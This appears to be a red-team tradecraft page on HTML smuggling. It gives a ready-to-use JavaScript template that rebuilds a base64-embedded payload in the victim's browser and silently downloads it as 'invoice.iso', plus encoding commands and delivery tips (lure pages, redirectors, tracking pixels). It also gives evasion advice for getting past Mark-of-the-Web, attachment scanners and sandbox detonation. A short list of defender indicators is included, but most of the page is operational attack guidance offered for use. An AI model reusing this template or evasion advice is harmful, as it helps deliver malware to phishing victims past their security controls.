**HTML smuggling** — hand the victim a harmless-looking `.html` file (attached or linked) whose JavaScript builds the real payload *inside their own browser* from data baked into the page, then triggers a download of it to disk. Because the payload is assembled client-side and never crosses the wire as a file, mail gateways and web proxies that scan attachments and downloads see only benign HTML and wave it through. Mechanically the JS base64-decodes an embedded blob into a `Blob` and saves it via an anchor `download` + `createObjectURL`; the victim then runs the dropped file.

## How it works

1. Victim opens the `.html` (nice-looking pretext page - a "document viewer", invoice, or business card). All content is local.
2. Embedded JavaScript base64-decodes the payload into an `ArrayBuffer`, wraps it in a `Blob`, and uses an anchor `download` + `createObjectURL` to save it to disk.
3. Victim runs the dropped file.

The JS can be obfuscated, so mail/proxy malware filters that look for known file bytes see only benign HTML. **MOTW note:** files saved via a blob download *do* receive MOTW on modern Chromium/Edge, so wrap executables in an [ISO/container](ISO%20and%20Container%20Files.md) or drop a [LNK](LNK%20Payloads.md) that survives it.

## Setup

Smuggling template that rebuilds a base64 binary into a Blob and downloads it (credit: HackerForce RTO template):

```js

<html><body></body></html>
<script>
  function base64ToArray(encodedData) {
    var binaryData = window.atob(encodedData);
    var len = binaryData.length;
    var bytesArray = new Uint8Array(len);
    for (var i = 0; i < len; i++) { bytesArray[i] = binaryData.charCodeAt(i); }
    return bytesArray.buffer;
  }

  var encodedData = '...';                 // base64 of your payload
  var bytesArray = base64ToArray(encodedData);
  var blobObject = new Blob([bytesArray], { type: 'application/octet-stream' });
  var payloadFilename = 'invoice.iso';     // hand the victim a container, not a bare .exe

  var anchor = document.createElement('a');
  document.body.appendChild(anchor);
  anchor.style = 'display: none';
  var url = window.URL.createObjectURL(blobObject);
  anchor.href = url;
  anchor.download = payloadFilename;
  anchor.click();
  window.URL.revokeObjectURL(url);
</script>

```

Base64-encode the payload as one continuous line:

```bash

# Kali (-w 0 disables line wrapping; xsel copies to clipboard)
cat payload.iso | base64 -w 0 | xsel -ib
# macOS
cat payload.iso | base64 -w 0 | pbcopy

```

Embed an avatar/branding as base64 too (avoids outbound requests that reveal the lure). Downsize first:

```bash

sips --resampleWidth 110 original.png --out avatar.png   # macOS
base64 -i avatar.png > base64_avatar.txt

```

Tooling that generates smuggling HTML: **SharpShooter**, **GoPhish** landing pages, or Cobalt Strike's HTML application templates.

## Delivery

- Attach the `.html` directly, or (better against attachment scanners) link to it behind a redirector.
- Add a **1×1 tracking pixel** and/or an onclick beacon to know when the page is opened and when the download button is clicked.

## Detection & OPSEC

- Browsers give blob downloads MOTW - always smuggle a **container/LNK**, never a bare `.exe`.
- Defenders flag: HTML attachments containing large base64 blobs, `Blob`/`msSaveOrOpenBlob`/`createObjectURL` + `download` anchors, and a browser writing an executable/ISO to Downloads with no network fetch.
- Newer email gateways detonate HTML attachments in a sandbox - randomize/obfuscate and consider link-based delivery.

## References

- The Hacker Recipes - Initial access (phishing) - https://www.thehacker.recipes/infra/phishing
- Outflank - HTML smuggling explained - https://outflank.nl/blog/2018/08/14/html-smuggling-explained/
- SharpShooter - https://github.com/mdsecactivebreach/SharpShooter
